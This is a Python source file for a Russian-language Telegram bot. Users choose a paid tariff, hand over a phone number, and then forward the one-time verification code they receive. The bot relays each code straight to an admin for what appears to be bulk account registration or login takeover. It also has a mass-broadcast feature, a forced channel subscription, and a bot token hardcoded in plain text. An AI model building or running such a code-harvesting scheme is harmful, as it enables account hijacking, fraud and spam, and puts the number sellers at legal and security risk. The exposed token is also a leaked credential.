import asyncio
import logging
import aiosqlite
import re
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (ReplyKeyboardMarkup, KeyboardButton, 
                            InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery)

# --- КОНФИГУРАЦИЯ ---
TOKEN = "8220500651:AAHKBf-AZ3UT7kH1oOrEEl-NwDWSE4DYoWw"
ADMIN_ID = 7323981601
CHANNEL_LINK = "https://t.me/+4K_4dildrI82ODY6"
CHANNEL_ID = -1003532318157

logging.basicConfig(level=logging.INFO)
bot = Bot(token=TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# --- СОСТОЯНИЯ ---
class Form(StatesGroup):
    choosing_tariff = State()
    entering_number = State()
    entering_code = State()
    broadcasting = State()

# --- БАЗА ДАННЫХ ---
async def init_db():
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('CREATE TABLE IF NOT EXISTS users (user_id INTEGER PRIMARY KEY)')
        await db.execute('''CREATE TABLE IF NOT EXISTS requests 
                           (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, 
                            phone TEXT, tariff TEXT, code TEXT, status INTEGER DEFAULT 0)''')
        await db.commit()

# --- КЛАВИАТУРЫ ---
def main_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="📱 Сдать номер"), KeyboardButton(text="📩 Отправить код")],
        [KeyboardButton(text="📢 Канал/Чат")]
    ], resize_keyboard=True)

def tariff_kb():
    return ReplyKeyboardMarkup(keyboard=[
        [KeyboardButton(text="⚡️ 1.5$ Рег Момент")],
        [KeyboardButton(text="🌙 2.5$ Вбх вечер")],
        [KeyboardButton(text="🔙 Назад")]
    ], resize_keyboard=True)

def admin_kb():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📂 Новые заявки", callback_data="admin_view_new")],
        [InlineKeyboardButton(text="📢 Рассылка", callback_data="admin_broadcast")]
    ])

# --- ПРОВЕРКА ПОДПИСКИ ---
async def check_sub(user_id):
    try:
        m = await bot.get_chat_member(CHANNEL_ID, user_id)
        return m.status in ['member', 'administrator', 'creator']
    except: 
        return False

# --- ОБРАБОТЧИКИ ---

@dp.message(Command("start"))
async def start(message: types.Message):
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('INSERT OR IGNORE INTO users VALUES (?)', (message.from_user.id,))
        await db.commit()
    
    if not await check_sub(message.from_user.id):
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔗 Вступить в канал", url=CHANNEL_LINK)],
            [InlineKeyboardButton(text="🔄 Я подписался", callback_data="check_sub_now")]
        ])
        return await message.answer("⚠️ **Доступ ограничен!**\nДля работы с ботом подпишитесь на наш приватный канал.", reply_markup=kb, parse_mode="Markdown")

    await message.answer(f"👋 Привет, {message.from_user.first_name}!\nВыбирай нужный пункт меню ниже:", reply_markup=main_kb())

@dp.callback_query(F.data == "check_sub_now")
async def check_sub_callback(callback: CallbackQuery):
    if await check_sub(callback.from_user.id):
        await callback.message.delete()
        await callback.message.answer("✅ Подписка подтверждена!", reply_markup=main_kb())
    else:
        await callback.answer("❌ Вы еще не подписаны на канал!", show_alert=True)

@dp.message(Command("admin"))
async def admin_panel(message: types.Message):
    if message.from_user.id == ADMIN_ID:
        await message.answer("🛠 **Панель администратора**", reply_markup=admin_kb(), parse_mode="Markdown")

# Логика сдачи номера
@dp.message(F.text == "📱 Сдать номер")
async def rent_start(message: types.Message, state: FSMContext):
    if not await check_sub(message.from_user.id):
        return await start(message)
    await state.set_state(Form.choosing_tariff)
    await message.answer("💵 **Выберите подходящий тариф:**", reply_markup=tariff_kb(), parse_mode="Markdown")

@dp.message(Form.choosing_tariff)
async def rent_tariff(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("Главное меню:", reply_markup=main_kb())
    
    await state.update_data(tariff=message.text)
    await state.set_state(Form.entering_number)
    await message.answer("📲 **Введите номер телефона**\nПример: `79211234567`", parse_mode="Markdown", 
                         reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔙 Назад")]], resize_keyboard=True))

@dp.message(Form.entering_number)
async def rent_number(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("Главное меню:", reply_markup=main_kb())

    phone = re.sub(r'\D', '', message.text)
    if len(phone) < 7 or len(phone) > 15:
        return await message.answer("❌ **Ошибка!** Введите номер цифрами (от 7 до 15 знаков).")

    data = await state.get_data()
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('INSERT INTO requests (user_id, phone, tariff) VALUES (?, ?, ?)', 
                         (message.from_user.id, phone, data['tariff']))
        await db.commit()
    
    await bot.send_message(ADMIN_ID, f"🆕 **Новая заявка!**\n📱 Номер: `{phone}`\n💰 Тариф: {data['tariff']}\n👤 Юзер: @{message.from_user.username or message.from_user.id}", parse_mode="Markdown")
    await state.clear()
    await message.answer("✅ **Заявка принята!**\nТеперь ждите. Как только я запрошу код, нажмите кнопку 'Отправить код'.", reply_markup=main_kb(), parse_mode="Markdown")

# Отправка кода
@dp.message(F.text == "📩 Отправить код")
async def code_start(message: types.Message, state: FSMContext):
    await state.set_state(Form.entering_code)
    await message.answer("🔑 **Введите полученный код:**", parse_mode="Markdown", reply_markup=ReplyKeyboardMarkup(keyboard=[[KeyboardButton(text="🔙 Назад")]], resize_keyboard=True))

@dp.message(Form.entering_code)
async def code_finish(message: types.Message, state: FSMContext):
    if message.text == "🔙 Назад":
        await state.clear()
        return await message.answer("Главное меню:", reply_markup=main_kb())

    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('UPDATE requests SET code = ? WHERE user_id = ? AND status = 0', (message.text, message.from_user.id))
        await db.commit()
    
    await bot.send_message(ADMIN_ID, f"🔑 **Пришел КОД!**\n👤 От: @{message.from_user.username or message.from_user.id}\n💬 Код: `{message.text}`", parse_mode="Markdown")
    await state.clear()
    await message.answer("✅ **Код передан!** Ожидайте подтверждения и выплаты.", reply_markup=main_kb(), parse_mode="Markdown")

@dp.message(F.text == "📢 Канал/Чат")
async def channel_info(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Перейти", url=CHANNEL_LINK)]])
    await message.answer("Наш официальный канал:", reply_markup=kb)

# --- АДМИНКА: ПРОСМОТР ОЧЕРЕДИ ---
@dp.callback_query(F.data == "admin_view_new")
async def view_requests(callback: CallbackQuery):
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT id, phone, tariff, user_id, code FROM requests WHERE status = 0 LIMIT 1') as cursor:
            row = await cursor.fetchone()
            
    if not row:
        return await callback.answer("Очередь пуста! 🎉", show_alert=True)
    
    code_text = row[4] if row[4] else "Ожидается..."
    text = (f"📋 **Заявка #{row[0]}**\n"
            f"📱 Номер: `{row[1]}`\n"
            f"💰 Тариф: {row[2]}\n"
            f"🔑 Код: `{code_text}`\n"
            f"👤 ID юзера: `{row[3]}`")
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="✅ Готово (Удалить)", callback_data=f"done_{row[0]}")],
        [InlineKeyboardButton(text="❌ Закрыть", callback_data="admin_close")]
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")

@dp.callback_query(F.data.startswith("done_"))
async def mark_done(callback: CallbackQuery):
    req_id = callback.data.split("_")[1]
    async with aiosqlite.connect('bot_database.db') as db:
        await db.execute('UPDATE requests SET status = 1 WHERE id = ?', (req_id,))
        await db.commit()
    await callback.answer("Убрано из очереди")
    await view_requests(callback)

@dp.callback_query(F.data == "admin_close")
async def admin_close(callback: CallbackQuery):
    await callback.message.delete()

# --- РАССЫЛКА ---
@dp.callback_query(F.data == "admin_broadcast")
async def broadcast_start(callback: CallbackQuery, state: FSMContext):
    await state.set_state(Form.broadcasting)
    await callback.message.answer("Введите текст рассылки (или 'отмена'):")

@dp.message(Form.broadcasting)
async def broadcast_do(message: types.Message, state: FSMContext):
    if message.text.lower() == 'отмена':
        await state.clear()
        return await message.answer("Отменено.")
    
    async with aiosqlite.connect('bot_database.db') as db:
        async with db.execute('SELECT user_id FROM users') as cursor:
            users = await cursor.fetchall()
    
    count = 0
    for user in users:
        try:
            await message.copy_to(user[0])
            count += 1
            await asyncio.sleep(0.05)
        except: pass
    
    await state.clear()
    await message.answer(f"✅ Рассылка завершена! Получили: {count} человек.")

async def main():
    await init_db()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
